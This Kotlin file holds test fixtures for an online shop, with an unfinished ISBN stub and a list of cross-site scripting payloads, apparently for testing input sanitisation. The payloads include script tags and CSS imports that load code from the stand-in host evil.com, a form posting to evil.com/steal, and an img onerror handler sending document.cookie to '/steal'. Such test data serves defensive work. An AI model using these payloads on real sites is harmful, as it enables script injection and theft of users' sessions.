package com.example.online.shop.model.test

import com.example.online.shop.model.Isbn

object IsbnTestData {

    //todo: add data for tests
    fun isbn() = Isbn(
        ""
    )
}

object XssTestData {

    fun xssScripts() = listOf(
        scriptTags(),
        eventHandlers(),
        javascriptProtocol(),
        dangerousTags(),
        styleAndLink(),
        dangerousFunctions(),
        imgOnError(),
        expression()
    ).flatten()

    fun scriptTags() = listOf(
        """<script>alert("XSS")</script>""",
        """<script type="text/javascript">maliciousCode()</script>""",
        """<script src="http://evil.com/xss.js"></script>""",
        """<script >document.cookie</script   >""",
        """<SCRIPT>alert(1)</SCRIPT>""",
        """<script\n>alert(1)</script>"""
    )

    fun eventHandlers() = listOf(
        """<div onclick="alert(1)">click me</div>""",
        """<img src=x onerror=alert("XSS")>""",
        """<body onload=maliciousFunction()>""",
        """<a onmouseover="alert(1)">hover</a>""",
        """<input onfocus=console.log("xss")>""",
        """<svg onload=alert(1)>"""
    )

    fun javascriptProtocol() = listOf(
        """<a href="javascript:alert(1)">click</a>""",
        """<iframe src="javascript:document.write(\'XSS\')"></iframe>""",
        """javascript:fetch(\'/steal\')""",
        """JAVASCRIPT:alert(1)""",
        """javascript://example.com%0Aalert(1)""",
        """<form action="javascript:void(0)"></form>""",
    )

    fun dangerousTags() = listOf(
        """<iframe src="http://evil.com"></iframe>""",
        """<form action="http://evil.com/steal"></form>""",
        """<meta http-equiv="refresh" content="0;url=javascript:alert(1)">""",
        """<object data="http://evil.com/xss.swf"></object>""",
        """<embed src="http://evil.com/xss.swf">""",
        """<applet code="malicious.class"></applet>"""
    )

    fun styleAndLink() = listOf(
        """<style>body { background: red; }</style>""",
        """<link rel="stylesheet" href="http://evil.com/xss.css">""",
        """<style type="text/css">@import "http://evil.com/xss.css";</style>""",
        """<link rel="import" href="http://evil.com/xss.html">""",
        """<style>@import url("http://evil.com/xss.css");</style>"""
    )

    fun dangerousFunctions() = listOf(
        """eval("alert(1)")""",
        """alert("XSS attack")""",
        """prompt("Enter password")""",
        """confirm("Are you sure?")""",
        """window.eval("malicious()")""",
        """setTimeout("alert(1)", 1000)"""
    )

    fun imgOnError() = listOf(
        """<img src="invalid" onerror="alert(1)">""",
        """<img onerror=alert(1) src=x>""",
        """<IMG SRC=X ONERROR=alert("XSS")>""",
        """<img src="x" onerror="fetch(\'/steal?cookie=\'+document.cookie)">""",
        """<img src=x onerror=\'alert(1)\'>"""
    )

    fun expression() = listOf(
        """<div style="width: expression(alert(1))">test</div>""",
        """background: url(javascript:alert(1))""",
        """color: expression(document.cookie)""",
        """url("javascript:alert(1)")""",
        """behavior: url(#default#behavior)"""
    )
}